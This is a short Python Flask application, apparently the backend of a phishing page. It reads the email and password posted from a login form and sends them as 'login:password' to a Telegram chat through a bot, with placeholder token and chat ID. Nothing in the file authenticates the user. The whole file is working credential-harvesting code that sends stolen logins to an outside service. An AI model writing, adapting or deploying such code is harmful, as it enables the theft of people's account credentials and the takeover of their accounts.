from flask import Flask
from flask import render_template, request

import telebot

app = Flask(__name__)



@app.route("/", methods = ['POST', 'GET'])
def index():
	if request.method == "POST":
		login = request.form['logemail']
		password = request.form['logpass']
		ID = 'CHAT ID'
		bot = telebot.TeleBot("TOKEN", parse_mode=None)
		bot.send_message(ID, login + ':' + password)
	else:
		print('get')
	return render_template('index.html')

app.run(debug = True)